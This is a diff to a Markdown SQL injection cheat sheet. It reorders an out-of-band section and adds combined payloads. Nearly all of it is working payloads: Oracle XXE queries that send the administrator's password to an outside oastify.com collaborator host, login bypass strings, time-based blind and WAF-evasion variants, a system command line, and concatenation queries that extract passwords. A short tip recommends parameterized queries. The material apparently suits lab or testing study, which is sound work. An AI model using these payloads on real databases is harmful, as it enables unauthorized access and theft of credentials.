@@ -127,6 +127,22 @@ This technique makes the database pause for a set amount of time, which helps de
 
 '||(SELECT CASE WHEN ((SELECT LENGTH(username) FROM users WHERE username='administrator')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'  
 ```
+
+---
+
+## Out-of-Band SQL Injection
+
+This type of SQLi triggers an out-of-band network connection to a system controlled by the attacker.
+
+- Less common but powerful.  
+- Uses protocols like DNS or HTTP.  
+
+**Payloads:**
+```sql  
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://1suq662zugex0quam6iqkwqbn2tthj58.oastify.com"> %remote;]>'),'/l') FROM dual--  
+
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.ccs1qhmaery8k1el6h2147am7dd41xpm.oastify.com"> %remote;]>'),'/l') FROM dual--  
+```
 ---
 
 ## 🧠 Advanced Blind SQLi Payloads
@@ -153,24 +169,50 @@ SELECT SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1
 ```
 ---
 
-## Out-of-Band SQL Injection
+## Combination SQLi Payloads
 
-This type of SQLi triggers an out-of-band network connection to a system controlled by the attacker.
+These payloads combine multiple SQLi techniques like authentication bypass, time delays, conditional queries, string concatenation, and WAF evasion.
 
-- Less common but powerful.  
-- Uses protocols like DNS or HTTP.  
-
-**Payloads:**
-```sql  
-' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://1suq662zugex0quam6iqkwqbn2tthj58.oastify.com"> %remote;]>'),'/l') FROM dual--  
-
-' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.ccs1qhmaery8k1el6h2147am7dd41xpm.oastify.com"> %remote;]>'),'/l') FROM dual--  
+**Simple Authentication Bypass:**  
+```sql
+'  
+' or 1=1--  
+' or 1=2--  
 ```
-
+**Conditional Queries:**  
+```sql
+SELECT IF(YOUR-CONDITION-HERE, (SELECT table_name FROM information_schema.tables), 'a')  
+SELECT IF(1=1, SLEEP(5), 'a')  
+SELECT SLEEP(10), NULL  
+```
+**Time-Based Blind SQLi:**  
+```sql
+SELECT IF(NOW()=SYSDATE(), SLEEP(5), 'a')  
+SELECT IF(NOW()=SYSDATE(1), SLEEP(5), 'a')  
+SELECT IF(NOW()=SYSDATE(), SLEEP(5), SLEEP(10))  
+```
+**WAF Bypass Payloads:**  
+```sql
+'XOR(IF(NOW()=SYSDATE(), SLEEP(5), 0))XOR'  
+'XOR(IF(NOW()=SYSDATE(), SLEEP(5), SLEEP(10)))XOR'  
+';(SELECT IF(NOW()=SYSDATE(1), SLEEP(5), SLEEP(10)));#  
+';(SELECT IF(NOW()=SYSDATE(), SLEEP(5), 'a'));#  
+```
+**System Command Execution:**  
+```sql
+';SYSTEM WHOAMI;#  
+```
+**Union-Based SQLi:** 
+```sql
+' UNION SELECT (SLEEP(3))--  
+SELECT 'hello'--  
+SELECT 'hel' || (SELECT SLEEP(10)) || 'lo'--  
+SELECT 'hel' || (SELECT password FROM users WHERE username='administrator') || 'lo'--  
+'||(SELECT password FROM users WHERE username='administrator')||'  
+'||(SELECT SLEEP(10))||'  
+```
 ---
 
 🧠 **Pro Tip:** Always use prepared statements and parameterized queries to prevent SQLi. Tools like [SQLMap](https://sqlmap.org/) can help with automated testing, but understanding the logic here will help you a lot.
 
 ---
-
-Let me know if you want me to add, tweak, or simplify anything else! 🚀
